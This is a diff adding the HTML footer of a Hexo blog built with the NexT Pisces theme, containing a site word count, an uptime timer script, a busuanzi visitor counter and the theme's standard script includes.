+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">8k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">7 分钟</span>
+</div>
+  <div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9waXNjZXMudGhlbWUtbmV4dC5vcmc=">NexT.Pisces</span> 强力驱动
+  </div>
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("06/12/2021 22:27:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
